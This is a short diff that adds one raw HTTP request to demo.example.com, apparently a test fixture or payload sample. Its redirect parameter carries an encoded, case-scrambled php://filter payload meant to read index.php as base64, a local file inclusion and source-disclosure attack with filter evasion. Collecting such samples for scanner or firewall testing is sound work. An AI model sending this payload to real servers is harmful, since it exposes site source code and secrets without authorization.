@@ -1,0 +1,4 @@
+GET /a?redirect=f%3DPhP://fIlTeR/rEaD%3DcOnVeRt.BaSe64-EnCoDe/ReSoUrCe%3DInDeX.pHp HTTP/1.1
+Host: demo.example.com
+Connection: close
+
